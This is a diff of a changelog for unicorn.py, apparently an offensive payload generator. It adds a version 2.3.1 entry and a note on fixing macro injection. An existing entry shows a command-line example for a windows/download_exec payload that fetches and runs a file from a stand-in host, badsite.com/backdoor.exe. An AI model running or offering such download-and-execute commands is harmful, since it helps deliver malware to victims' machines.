@@ -1,8 +1,15 @@
 ~~~~~~~~~~~~~~~~
+version 2.3.1
+~~~~~~~~~~~~~~~~
+
+* fix indent issue
+
+~~~~~~~~~~~~~~~~
 version 2.3
 ~~~~~~~~~~~~~~~~
 
 * added support for windows/download_exec as a payload option - just run python unicorn.py windows/download_exec exe=exename.exe url=http://badsite.com/backdoor.exe - note it doesn't need to be an exe, whatever you want to download and execute
+* fixes an issue that caused macro injection to not properly work (duplicate powershell command)
 
 ~~~~~~~~~~~~~~~~
 version 2.2
